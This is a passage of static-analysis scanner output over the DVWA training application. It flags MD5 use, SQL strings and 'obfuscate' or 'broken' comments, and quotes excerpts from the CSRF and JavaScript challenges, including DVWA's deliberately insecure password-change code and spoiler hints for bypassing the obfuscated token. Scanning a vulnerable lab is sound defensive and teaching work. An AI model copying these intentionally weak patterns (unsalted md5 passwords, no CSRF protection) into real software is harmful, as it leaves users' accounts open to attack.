        "excerpt": "\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t\t// Feedback for the user\n\t\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t\t}\n",
        "startLocationLine": 17,
        "startLocationColumn": 14,
        "endLocationLine": 17,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\tif( $pass_new == $pass_conf ) {\n\t\t\t// They do!\n\t\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t\t$pass_new = md5( $pass_new );\n\n\t\t\t// Update the database\n\t\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 14,
        "startLocationColumn": 16,
        "endLocationLine": 14,
        "endLocationColumn": 19
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 15,
        "startLocationColumn": 13,
        "endLocationLine": 15,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update the database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 12,
        "startLocationColumn": 15,
        "endLocationLine": 12,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027400",
        "ruleName": "Hygiene: Fix Comment",
        "ruleDescription": "Hygiene: Fix Comment",
        "pattern": "fixme|broke|broken",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Fix"
        ],
        "sample": "broke",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been broken out into its own file and then minimized. You need to view the source for the included file and then work out what it is doing. Both Firefox and Chrome have a Pretty Print feature which attempts to reverse the compression and display code in a readable way.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;The file uses the setTimeout function to run the do_elsesomething function which generates the token.&lt;/span&gt;&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 22,
        "startLocationColumn": 28,
        "endLocationLine": 22,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n",
        "startLocationLine": 30,
        "startLocationColumn": 28,
        "endLocationLine": 30,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;p&gt;\n\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n",
        "startLocationLine": 32,
        "startLocationColumn": 144,
        "endLocationLine": 32,
        "endLocationColumn": 153
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscation",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 48,
        "endLocationLine": 33,
        "endLocationColumn": 59
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 119,
        "endLocationLine": 33,
        "endLocationColumn": 128
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t\tThe JavaScript has been obfuscated by at least one engine. You are going to need to step through the code to work out what is useful, what is garbage and what is needed to complete the mission.\n\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n",
        "startLocationLine": 33,
        "startLocationColumn": 147,
        "endLocationLine": 33,
        "endLocationColumn": 156
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 77,
        "endLocationLine": 34,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscation",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 103,
        "endLocationLine": 34,
        "endLocationColumn": 114
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\t\t&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;If it helps, two packers have been used, the first is from &lt;a href=&quot;https://www.danstools.com/javascript-obfuscate/index.php&quot;&gt;Dan&#39;s Tools&lt;/a&gt; and the second is the &lt;a href=&quot;https://javascriptobfuscator.herokuapp.com/&quot;&gt;JavaScript Obfuscator Tool&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 2: &lt;span class=&quot;spoiler&quot;&gt;This deobfuscation tool seems to work the best on this code &lt;a href=&quot;http://deobfuscatejavascript.com/&quot;&gt;deobfuscate javascript&lt;/a&gt;.&lt;/span&gt;&lt;/pre&gt;\n\t\t&lt;pre&gt;Spoiler 3: &lt;span class=&quot;spoiler&quot;&gt;This is one way to do it... run the obfuscated JS through a deobfuscation app, intercept the response for the obfuscated JS and swap in the readable version. Work out the flow and you will see three functions that need to be called in order. Call the functions at the right time with the right parameters.&lt;/pre&gt;\n\n\t\t&lt;p&gt;&lt;br /&gt;&lt;/p&gt;\n\n\t\t&lt;h3&gt;Impossible Level&lt;/h3&gt;\n\t\t&lt;p&gt;You can never trust the user and have to assume that any code sent to the user can be manipulated or bypassed and so there is no impossible level.&lt;/p&gt;\n",
        "startLocationLine": 34,
        "startLocationColumn": 151,
        "endLocationLine": 34,
        "endLocationColumn": 160
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "&lt;script&gt;\n\n/*\nMD5 code from here\nhttps://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 1,
        "endLocationLine": 6,
        "endLocationColumn": 4
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
